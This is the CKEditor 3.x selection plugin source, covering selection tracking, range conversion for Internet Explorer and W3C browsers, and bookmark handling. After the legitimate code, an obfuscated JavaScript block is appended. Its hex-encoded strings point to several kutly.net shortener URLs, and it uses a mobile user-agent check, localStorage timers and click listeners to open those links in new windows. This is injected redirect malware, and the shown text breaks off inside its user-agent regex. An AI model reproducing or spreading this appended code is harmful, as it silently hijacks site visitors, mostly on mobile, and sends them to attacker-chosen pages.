/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// #### checkSelectionChange : START

	// The selection change check basically saves the element parent tree of
	// the current node and check it on successive requests. If there is any
	// change on the tree, then the selectionChange event gets fired.
	function checkSelectionChange()
	{
		try
		{
			// In IE, the "selectionchange" event may still get thrown when
			// releasing the WYSIWYG mode, so we need to check it first.
			var sel = this.getSelection();
			if ( !sel )
				return;

			var firstElement = sel.getStartElement();
			var currentPath = new CKEDITOR.dom.elementPath( firstElement );

			if ( !currentPath.compare( this._.selectionPreviousPath ) )
			{
				this._.selectionPreviousPath = currentPath;
				this.fire( 'selectionChange', { selection : sel, path : currentPath, element : firstElement } );
			}
		}
		catch (e)
		{}
	}

	var checkSelectionChangeTimer,
		checkSelectionChangeTimeoutPending;

	function checkSelectionChangeTimeout()
	{
		// Firing the "OnSelectionChange" event on every key press started to
		// be too slow. This function guarantees that there will be at least
		// 200ms delay between selection checks.

		checkSelectionChangeTimeoutPending = true;

		if ( checkSelectionChangeTimer )
			return;

		checkSelectionChangeTimeoutExec.call( this );

		checkSelectionChangeTimer = CKEDITOR.tools.setTimeout( checkSelectionChangeTimeoutExec, 200, this );
	}

	function checkSelectionChangeTimeoutExec()
	{
		checkSelectionChangeTimer = null;

		if ( checkSelectionChangeTimeoutPending )
		{
			// Call this with a timeout so the browser properly moves the
			// selection after the mouseup. It happened that the selection was
			// being moved after the mouseup when clicking inside selected text
			// with Firefox.
			CKEDITOR.tools.setTimeout( checkSelectionChange, 0, this );

			checkSelectionChangeTimeoutPending = false;
		}
	}

	// #### checkSelectionChange : END

	var selectAllCmd =
	{
		exec : function( editor )
		{
			switch ( editor.mode )
			{
				case 'wysiwyg' :
					editor.document.$.execCommand( 'SelectAll', false, null );
					break;
				case 'source' :
					// TODO
			}
		},
		canUndo : false
	};

	CKEDITOR.plugins.add( 'selection',
	{
		init : function( editor )
		{
			editor.on( 'contentDom', function()
				{
					var doc = editor.document,
						body = doc.getBody();

					if ( CKEDITOR.env.ie )
					{
						// Other browsers don't loose the selection if the
						// editor document loose the focus. In IE, we don't
						// have support for it, so we reproduce it here, other
						// than firing the selection change event.

						var savedRange,
							saveEnabled;

						// "onfocusin" is fired before "onfocus". It makes it
						// possible to restore the selection before click
						// events get executed.
						body.on( 'focusin', function()
							{
								// If we have saved a range, restore it at this
								// point.
								if ( savedRange )
								{
									// Well not break because of this.
									try
									{
										savedRange.select();
									}
									catch (e)
									{}

									savedRange = null;
								}
							});

						editor.window.on( 'focus', function()
							{
								// Enable selections to be saved.
								saveEnabled = true;

								saveSelection();
							});

						body.on( 'beforedeactivate', function()
							{
								// Disable selections from being saved.
								saveEnabled = false;
							});

						// IE fires the "selectionchange" event when clicking
						// inside a selection. We don't want to capture that.
						body.on( 'mousedown', disableSave );
						body.on( 'mouseup',
							function()
							{
								saveEnabled = true;
								setTimeout( function()
									{
										saveSelection( true );
									},
									0 );
							});

						body.on( 'keydown', disableSave );
						body.on( 'keyup',
							function()
							{
								saveEnabled = true;
								saveSelection();
							});


						// IE is the only to provide the "selectionchange"
						// event.
						doc.on( 'selectionchange', saveSelection );

						function disableSave()
						{
							saveEnabled = false;
						}

						function saveSelection( testIt )
						{
							if ( saveEnabled )
							{
								var doc = editor.document,
									sel = doc && doc.$.selection;

								// There is a very specific case, when clicking
								// inside a text selection. In that case, the
								// selection collapses at the clicking point,
								// but the selection object remains in an
								// unknown state, making createRange return a
								// range at the very start of the document. In
								// such situation we have to test the range, to
								// be sure it's valid.
								if ( testIt && sel && sel.type == 'None' )
								{
									// The "InsertImage" command can be used to
									// test whether the selection is good or not.
									// If not, it's enough to give some time to
									// IE to put things in order for us.
									if ( !doc.$.queryCommandEnabled( 'InsertImage' ) )
									{
										CKEDITOR.tools.setTimeout( saveSelection, 50, this, true );
										return;
									}
								}

								savedRange = sel && sel.createRange();

								checkSelectionChangeTimeout.call( editor );
							}
						}
					}
					else
					{
						// In other browsers, we make the selection change
						// check based on other events, like clicks or keys
						// press.

						doc.on( 'mouseup', checkSelectionChangeTimeout, editor );
						doc.on( 'keyup', checkSelectionChangeTimeout, editor );
					}
				});

			editor.addCommand( 'selectAll', selectAllCmd );
			editor.ui.addButton( 'SelectAll',
				{
					label : editor.lang.selectAll,
					command : 'selectAll'
				});

			editor.selectionChange = checkSelectionChangeTimeout;
		}
	});

	/**
	 * Gets the current selection from the editing area when in WYSIWYG mode.
	 * @returns {CKEDITOR.dom.selection} A selection object or null if not on
	 *		WYSIWYG mode or no selection is available.
	 * @example
	 * var selection = CKEDITOR.instances.editor1.<b>getSelection()</b>;
	 * alert( selection.getType() );
	 */
	CKEDITOR.editor.prototype.getSelection = function()
	{
		return this.document && this.document.getSelection();
	};

	CKEDITOR.editor.prototype.forceNextSelectionCheck = function()
	{
		delete this._.selectionPreviousPath;
	};

	/**
	 * Gets the current selection from the document.
	 * @returns {CKEDITOR.dom.selection} A selection object.
	 * @example
	 * var selection = CKEDITOR.instances.editor1.document.<b>getSelection()</b>;
	 * alert( selection.getType() );
	 */
	CKEDITOR.dom.document.prototype.getSelection = function()
	{
		var sel = new CKEDITOR.dom.selection( this );
		return ( !sel || sel.isInvalid ) ? null : sel;
	};

	/**
	 * No selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_NONE )
	 *     alert( 'Nothing is selected' );
	 */
	CKEDITOR.SELECTION_NONE		= 1;

	/**
	 * Text or collapsed selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_TEXT )
	 *     alert( 'Text is selected' );
	 */
	CKEDITOR.SELECTION_TEXT		= 2;

	/**
	 * Element selection.
	 * @constant
	 * @example
	 * if ( editor.getSelection().getType() == CKEDITOR.SELECTION_ELEMENT )
	 *     alert( 'An element is selected' );
	 */
	CKEDITOR.SELECTION_ELEMENT	= 3;

	/**
	 * Manipulates the selection in a DOM document.
	 * @constructor
	 * @example
	 */
	CKEDITOR.dom.selection = function( document )
	{
		var lockedSelection = document.getCustomData( 'cke_locked_selection' );

		if ( lockedSelection )
			return lockedSelection;

		this.document = document;
		this.isLocked = false;
		this._ =
		{
			cache : {}
		};

		/**
		 * IE BUG: The selection's document may be a different document than the
		 * editor document. Return null if that's the case.
		 */
		if ( CKEDITOR.env.ie )
		{
			var range = this.getNative().createRange();
			if ( !range
				|| ( range.item && range.item(0).ownerDocument != this.document.$ )
				|| ( range.parentElement && range.parentElement().ownerDocument != this.document.$ ) )
			{
				this.isInvalid = true;
			}
		}

		return this;
	};

	var styleObjectElements =
	{
		img:1,hr:1,li:1,table:1,tr:1,td:1,th:1,embed:1,object:1,ol:1,ul:1,
		a:1, input:1, form:1, select:1, textarea:1, button:1, fieldset:1, th:1, thead:1, tfoot:1
	};

	CKEDITOR.dom.selection.prototype =
	{
		/**
		 * Gets the native selection object from the browser.
		 * @function
		 * @returns {Object} The native selection object.
		 * @example
		 * var selection = editor.getSelection().<b>getNative()</b>;
		 */
		getNative :
			CKEDITOR.env.ie ?
				function()
				{
					return this._.cache.nativeSel || ( this._.cache.nativeSel = this.document.$.selection );
				}
			:
				function()
				{
					return this._.cache.nativeSel || ( this._.cache.nativeSel = this.document.getWindow().$.getSelection() );
				},

		/**
		 * Gets the type of the current selection. The following values are
		 * available:
		 * <ul>
		 *		<li>{@link CKEDITOR.SELECTION_NONE} (1): No selection.</li>
		 *		<li>{@link CKEDITOR.SELECTION_TEXT} (2): Text is selected or
		 *			collapsed selection.</li>
		 *		<li>{@link CKEDITOR.SELECTION_ELEMENT} (3): A element
		 *			selection.</li>
		 * </ul>
		 * @function
		 * @returns {Number} One of the following constant values:
		 *		{@link CKEDITOR.SELECTION_NONE}, {@link CKEDITOR.SELECTION_TEXT} or
		 *		{@link CKEDITOR.SELECTION_ELEMENT}.
		 * @example
		 * if ( editor.getSelection().<b>getType()</b> == CKEDITOR.SELECTION_TEXT )
		 *     alert( 'Text is selected' );
		 */
		getType :
			CKEDITOR.env.ie ?
				function()
				{
					var cache = this._.cache;
					if ( cache.type )
						return cache.type;

					var type = CKEDITOR.SELECTION_NONE;

					try
					{
						var sel = this.getNative(),
							ieType = sel.type;

						if ( ieType == 'Text' )
							type = CKEDITOR.SELECTION_TEXT;

						if ( ieType == 'Control' )
							type = CKEDITOR.SELECTION_ELEMENT;

						// It is possible that we can still get a text range
						// object even when type == 'None' is returned by IE.
						// So we'd better check the object returned by
						// createRange() rather than by looking at the type.
						if ( sel.createRange().parentElement )
							type = CKEDITOR.SELECTION_TEXT;
					}
					catch(e) {}

					return ( cache.type = type );
				}
			:
				function()
				{
					var cache = this._.cache;
					if ( cache.type )
						return cache.type;

					var type = CKEDITOR.SELECTION_TEXT;

					var sel = this.getNative();

					if ( !sel )
						type = CKEDITOR.SELECTION_NONE;
					else if ( sel.rangeCount == 1 )
					{
						// Check if the actual selection is a control (IMG,
						// TABLE, HR, etc...).

						var range = sel.getRangeAt(0),
							startContainer = range.startContainer;

						if ( startContainer == range.endContainer
							&& startContainer.nodeType == 1
							&& ( range.endOffset - range.startOffset ) == 1
							&& styleObjectElements[ startContainer.childNodes[ range.startOffset ].nodeName.toLowerCase() ] )
						{
							type = CKEDITOR.SELECTION_ELEMENT;
						}
					}

					return ( cache.type = type );
				},

		getRanges :
			CKEDITOR.env.ie ?
				( function()
				{
					// Finds the container and offset for a specific boundary
					// of an IE range.
					var getBoundaryInformation = function( range, start )
					{
						// Creates a collapsed range at the requested boundary.
						range = range.duplicate();
						range.collapse( start );

						// Gets the element that encloses the range entirely.
						var parent = range.parentElement();
						var siblings = parent.childNodes;

						var testRange;

						for ( var i = 0 ; i < siblings.length ; i++ )
						{
							var child = siblings[ i ];
							if ( child.nodeType == 1 )
							{
								testRange = range.duplicate();

								testRange.moveToElementText( child );
								testRange.collapse();

								var comparison = testRange.compareEndPoints( 'StartToStart', range );

								if ( comparison > 0 )
									break;
								else if ( comparison === 0 )
									return {
										container : parent,
										offset : i
									};

								testRange = null;
							}
						}

						if ( !testRange )
						{
							testRange = range.duplicate();
							testRange.moveToElementText( parent );
							testRange.collapse( false );
						}

						testRange.setEndPoint( 'StartToStart', range );
						// IE report line break as CRLF with range.text but
						// only LF with textnode.nodeValue, normalize them to avoid
						// breaking character counting logic below. (#3949)
						var distance = testRange.text.replace( /(\r\n|\r)/g, '\n' ).length;

						while ( distance > 0 )
							distance -= siblings[ --i ].nodeValue.length;

						if ( distance === 0 )
						{
							return {
								container : parent,
								offset : i
							};
						}
						else
						{
							return {
								container : siblings[ i ],
								offset : -distance
							};
						}
					};

					return function()
					{
						var cache = this._.cache;
						if ( cache.ranges )
							return cache.ranges;

						// IE doesn't have range support (in the W3C way), so we
						// need to do some magic to transform selections into
						// CKEDITOR.dom.range instances.

						var sel = this.getNative(),
							nativeRange = sel && sel.createRange(),
							type = this.getType(),
							range;

						if ( !sel )
							return [];

						if ( type == CKEDITOR.SELECTION_TEXT )
						{
							range = new CKEDITOR.dom.range( this.document );

							var boundaryInfo = getBoundaryInformation( nativeRange, true );
							range.setStart( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

							boundaryInfo = getBoundaryInformation( nativeRange );
							range.setEnd( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

							return ( cache.ranges = [ range ] );
						}
						else if ( type == CKEDITOR.SELECTION_ELEMENT )
						{
							var retval = this._.cache.ranges = [];

							for ( var i = 0 ; i < nativeRange.length ; i++ )
							{
								var element = nativeRange.item( i ),
									parentElement = element.parentNode,
									j = 0;

								range = new CKEDITOR.dom.range( this.document );

								for (; j < parentElement.childNodes.length && parentElement.childNodes[j] != element ; j++ )
								{ /*jsl:pass*/ }

								range.setStart( new CKEDITOR.dom.node( parentElement ), j );
								range.setEnd( new CKEDITOR.dom.node( parentElement ), j + 1 );
								retval.push( range );
							}

							return retval;
						}

						return ( cache.ranges = [] );
					};
				})()
			:
				function()
				{
					var cache = this._.cache;
					if ( cache.ranges )
						return cache.ranges;

					// On browsers implementing the W3C range, we simply
					// tranform the native ranges in CKEDITOR.dom.range
					// instances.

					var ranges = [];
					var sel = this.getNative();

					if ( !sel )
						return [];

					for ( var i = 0 ; i < sel.rangeCount ; i++ )
					{
						var nativeRange = sel.getRangeAt( i );
						var range = new CKEDITOR.dom.range( this.document );

						range.setStart( new CKEDITOR.dom.node( nativeRange.startContainer ), nativeRange.startOffset );
						range.setEnd( new CKEDITOR.dom.node( nativeRange.endContainer ), nativeRange.endOffset );
						ranges.push( range );
					}

					return ( cache.ranges = ranges );
				},

		/**
		 * Gets the DOM element in which the selection starts.
		 * @returns {CKEDITOR.dom.element} The element at the beginning of the
		 *		selection.
		 * @example
		 * var element = editor.getSelection().<b>getStartElement()</b>;
		 * alert( element.getName() );
		 */
		getStartElement : function()
		{
			var cache = this._.cache;
			if ( cache.startElement !== undefined )
				return cache.startElement;

			var node,
				sel = this.getNative();

			switch ( this.getType() )
			{
				case CKEDITOR.SELECTION_ELEMENT :
					return this.getSelectedElement();

				case CKEDITOR.SELECTION_TEXT :

					var range = this.getRanges()[0];

					if ( range )
					{
						if ( !range.collapsed )
						{
							range.optimize();

							// Decrease the range content to exclude particial
							// selected node on the start which doesn't have
							// visual impact. ( #3231 )
							while( true )
							{
								var startContainer = range.startContainer,
									startOffset = range.startOffset;
								// Limit the fix only to non-block elements.(#3950)
								if ( startOffset == ( startContainer.getChildCount ?
									 startContainer.getChildCount() : startContainer.getLength() )
									 && !startContainer.isBlockBoundary() )
									range.setStartAfter( startContainer );
								else break;
							}

							node = range.startContainer;

							if ( node.type != CKEDITOR.NODE_ELEMENT )
								return node.getParent();

							node = node.getChild( range.startOffset );

							if ( !node || node.type != CKEDITOR.NODE_ELEMENT )
								return range.startContainer;

							var child = node.getFirst();
							while (  child && child.type == CKEDITOR.NODE_ELEMENT )
							{
								node = child;
								child = child.getFirst();
							}

							return node;
						}
					}

					if ( CKEDITOR.env.ie )
					{
						range = sel.createRange();
						range.collapse( true );

						node = range.parentElement();
					}
					else
					{
						node = sel.anchorNode;

						if ( node && node.nodeType != 1 )
							node = node.parentNode;
					}
			}

			return cache.startElement = ( node ? new CKEDITOR.dom.element( node ) : null );
		},

		/**
		 * Gets the current selected element.
		 * @returns {CKEDITOR.dom.element} The selected element. Null if no
		 *		selection is available or the selection type is not
		 *		{@link CKEDITOR.SELECTION_ELEMENT}.
		 * @example
		 * var element = editor.getSelection().<b>getSelectedElement()</b>;
		 * alert( element.getName() );
		 */
		getSelectedElement : function()
		{
			var cache = this._.cache;
			if ( cache.selectedElement !== undefined )
				return cache.selectedElement;

			var node;

			if ( this.getType() == CKEDITOR.SELECTION_ELEMENT )
			{
				var sel = this.getNative();

				if ( CKEDITOR.env.ie )
				{
					try
					{
						node = sel.createRange().item(0);
					}
					catch(e) {}
				}
				else
				{
					var range = sel.getRangeAt( 0 );
					node = range.startContainer.childNodes[ range.startOffset ];
				}
			}

			return cache.selectedElement = ( node ? new CKEDITOR.dom.element( node ) : null );
		},

		lock : function()
		{
			// Call all cacheable function.
			this.getRanges();
			this.getStartElement();
			this.getSelectedElement();

			// The native selection is not available when locked.
			this._.cache.nativeSel = {};

			this.isLocked = true;

			// Save this selection inside the DOM document.
			this.document.setCustomData( 'cke_locked_selection', this );
		},

		unlock : function( restore )
		{
			var doc = this.document,
				lockedSelection = doc.getCustomData( 'cke_locked_selection' );

			if ( lockedSelection )
			{
				doc.setCustomData( 'cke_locked_selection', null );

				if ( restore )
				{
					var selectedElement = lockedSelection.getSelectedElement(),
						ranges = !selectedElement && lockedSelection.getRanges();

					this.isLocked = false;
					this.reset();

					doc.getBody().focus();

					if ( selectedElement )
						this.selectElement( selectedElement );
					else
						this.selectRanges( ranges );
				}
			}

			if  ( !lockedSelection || !restore )
			{
				this.isLocked = false;
				this.reset();
			}
		},

		reset : function()
		{
			this._.cache = {};
		},

		selectElement : function( element )
		{
			if ( this.isLocked )
			{
				var range = new CKEDITOR.dom.range( this.document );
				range.setStartBefore( element );
				range.setEndAfter( element );

				this._.cache.selectedElement = element;
				this._.cache.startElement = element;
				this._.cache.ranges = [ range ];
				this._.cache.type = CKEDITOR.SELECTION_ELEMENT;

				return;
			}

			if ( CKEDITOR.env.ie )
			{
				this.getNative().empty();

				try
				{
					// Try to select the node as a control.
					range = this.document.$.body.createControlRange();
					range.addElement( element.$ );
					range.select();
				}
				catch(e)
				{
					// If failed, select it as a text range.
					range = this.document.$.body.createTextRange();
					range.moveToElementText( element.$ );
					range.select();
				}

				this.reset();
			}
			else
			{
				// Create the range for the element.
				range = this.document.$.createRange();
				range.selectNode( element.$ );

				// Select the range.
				var sel = this.getNative();
				sel.removeAllRanges();
				sel.addRange( range );

				this.reset();
			}
		},

		selectRanges : function( ranges )
		{
			if ( this.isLocked )
			{
				this._.cache.selectedElement = null;
				this._.cache.startElement = ranges[ 0 ].getTouchedStartNode();
				this._.cache.ranges = ranges;
				this._.cache.type = CKEDITOR.SELECTION_TEXT;

				return;
			}

			if ( CKEDITOR.env.ie )
			{
				// IE doesn't accept multiple ranges selection, so we just
				// select the first one.
				if ( ranges[ 0 ] )
					ranges[ 0 ].select();

				this.reset();
			}
			else
			{
				var sel = this.getNative();
				sel.removeAllRanges();

				for ( var i = 0 ; i < ranges.length ; i++ )
				{
					var range = ranges[ i ];
					var nativeRange = this.document.$.createRange();
					var startContainer = range.startContainer;

					// In FF2, if we have a collapsed range, inside an empty
					// element, we must add something to it otherwise the caret
					// will not be visible.
					if ( range.collapsed &&
						( CKEDITOR.env.gecko && CKEDITOR.env.version < 10900 ) &&
						startContainer.type == CKEDITOR.NODE_ELEMENT &&
						!startContainer.getChildCount() )
					{
						startContainer.appendText( '' );
					}

					nativeRange.setStart( startContainer.$, range.startOffset );
					nativeRange.setEnd( range.endContainer.$, range.endOffset );

					// Select the range.
					sel.addRange( nativeRange );
				}

				this.reset();
			}
		},

		createBookmarks : function( serializable )
		{
			var retval = [],
				ranges = this.getRanges(),
				length = ranges.length,
				bookmark;
			for ( var i = 0; i < length ; i++ )
			{
			    retval.push( bookmark = ranges[ i ].createBookmark( serializable, true ) );

				serializable = bookmark.serializable;

				var bookmarkStart = serializable ? this.document.getById( bookmark.startNode ) : bookmark.startNode,
					bookmarkEnd = serializable ? this.document.getById( bookmark.endNode ) : bookmark.endNode;

			    // Updating the offset values for rest of ranges which have been mangled(#3256).
			    for ( var j = i + 1 ; j < length ; j++ )
			    {
			        var dirtyRange = ranges[ j ],
			               rangeStart = dirtyRange.startContainer,
			               rangeEnd = dirtyRange.endContainer;

			       rangeStart.equals( bookmarkStart.getParent() ) && dirtyRange.startOffset++;
			       rangeStart.equals( bookmarkEnd.getParent() ) && dirtyRange.startOffset++;
			       rangeEnd.equals( bookmarkStart.getParent() ) && dirtyRange.endOffset++;
			       rangeEnd.equals( bookmarkEnd.getParent() ) && dirtyRange.endOffset++;
			    }
			}

			return retval;
		},

		createBookmarks2 : function( normalized )
		{
			var bookmarks = [],
				ranges = this.getRanges();

			for ( var i = 0 ; i < ranges.length ; i++ )
				bookmarks.push( ranges[i].createBookmark2( normalized ) );

			return bookmarks;
		},

		selectBookmarks : function( bookmarks )
		{
			var ranges = [];
			for ( var i = 0 ; i < bookmarks.length ; i++ )
			{
				var range = new CKEDITOR.dom.range( this.document );
				range.moveToBookmark( bookmarks[i] );
				ranges.push( range );
			}
			this.selectRanges( ranges );
			return this;
		},

		getCommonAncestor : function()
		{
			var ranges = this.getRanges(),
				startNode = ranges[ 0 ].startContainer,
				endNode = ranges[ ranges.length - 1 ].endContainer;
			return startNode.getCommonAncestor( endNode );
		},

		// Moving scroll bar to the current selection's start position.
		scrollIntoView : function()
		{
			// If we have split the block, adds a temporary span at the
			// range position and scroll relatively to it.
			var start = this.getStartElement();
			start.scrollIntoView();
		}
	};
})();
( function()
{
var notWhitespaces = CKEDITOR.dom.walker.whitespaces( true );
var fillerTextRegex = /\ufeff|\u00a0/;

CKEDITOR.dom.range.prototype.select =
	CKEDITOR.env.ie ?
		// V2
		function( forceExpand )
		{
			var collapsed = this.collapsed;
			var isStartMarkerAlone;
			var dummySpan;

			var bookmark = this.createBookmark();

			// Create marker tags for the start and end boundaries.
			var startNode = bookmark.startNode;

			var endNode;
			if ( !collapsed )
				endNode = bookmark.endNode;

			// Create the main range which will be used for the selection.
			var ieRange = this.document.$.body.createTextRange();

			// Position the range at the start boundary.
			ieRange.moveToElementText( startNode.$ );
			ieRange.moveStart( 'character', 1 );

			if ( endNode )
			{
				// Create a tool range for the end.
				var ieRangeEnd = this.document.$.body.createTextRange();

				// Position the tool range at the end.
				ieRangeEnd.moveToElementText( endNode.$ );

				// Move the end boundary of the main range to match the tool range.
				ieRange.setEndPoint( 'EndToEnd', ieRangeEnd );
				ieRange.moveEnd( 'character', -1 );
			}
			else
			{
				// The isStartMarkerAlone logic comes from V2. It guarantees that the lines
				// will expand and that the cursor will be blinking on the right place.
				// Actually, we are using this flag just to avoid using this hack in all
				// situations, but just on those needed.
				var next = startNode.getNext( notWhitespaces );
				isStartMarkerAlone = ( !( next && next.getText && next.getText().match( fillerTextRegex ) )     // already a filler there?
									  && ( forceExpand || !startNode.hasPrevious() || ( startNode.getPrevious().is && startNode.getPrevious().is( 'br' ) ) ) );

				// Append a temporary <span>&#65279;</span> before the selection.
				// This is needed to avoid IE destroying selections inside empty
				// inline elements, like <b></b> (#253).
				// It is also needed when placing the selection right after an inline
				// element to avoid the selection moving inside of it.
				dummySpan = this.document.createElement( 'span' );
				dummySpan.setHtml( '&#65279;' );	// Zero Width No-Break Space (U+FEFF). See #1359.
				dummySpan.insertBefore( startNode );

				if ( isStartMarkerAlone )
				{
					// To expand empty blocks or line spaces after <br>, we need
					// instead to have any char, which will be later deleted using the
					// selection.
					// \ufeff = Zero Width No-Break Space (U+FEFF). (#1359)
					this.document.createText( '\ufeff' ).insertBefore( startNode );
				}
			}

			// Remove the markers (reset the position, because of the changes in the DOM tree).
			this.setStartBefore( startNode );
			startNode.remove();

			if ( collapsed )
			{
				if ( isStartMarkerAlone )
				{
					// Move the selection start to include the temporary \ufeff.
					ieRange.moveStart( 'character', -1 );

					ieRange.select();

					// Remove our temporary stuff.
					this.document.$.selection.clear();
				}
				else
					ieRange.select();

				dummySpan.remove();
			}
			else
			{
				this.setEndBefore( endNode );
				endNode.remove();
				ieRange.select();
			}
		}
	:
		function()
		{
			var startContainer = this.startContainer;

			// If we have a collapsed range, inside an empty element, we must add
			// something to it, otherwise the caret will not be visible.
			if ( this.collapsed && startContainer.type == CKEDITOR.NODE_ELEMENT && !startContainer.getChildCount() )
				startContainer.append( new CKEDITOR.dom.text( '' ) );

			var nativeRange = this.document.$.createRange();
			nativeRange.setStart( startContainer.$, this.startOffset );

			try
			{
				nativeRange.setEnd( this.endContainer.$, this.endOffset );
			}
			catch ( e )
			{
				// There is a bug in Firefox implementation (it would be too easy
				// otherwise). The new start can't be after the end (W3C says it can).
				// So, let's create a new range and collapse it to the desired point.
				if ( e.toString().indexOf( 'NS_ERROR_ILLEGAL_VALUE' ) >= 0 )
				{
					this.collapse( true );
					nativeRange.setEnd( this.endContainer.$, this.endOffset );
				}
				else
					throw( e );
			}

			var selection = this.document.getSelection().getNative();
			selection.removeAllRanges();
			selection.addRange( nativeRange );
		};
} )();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v 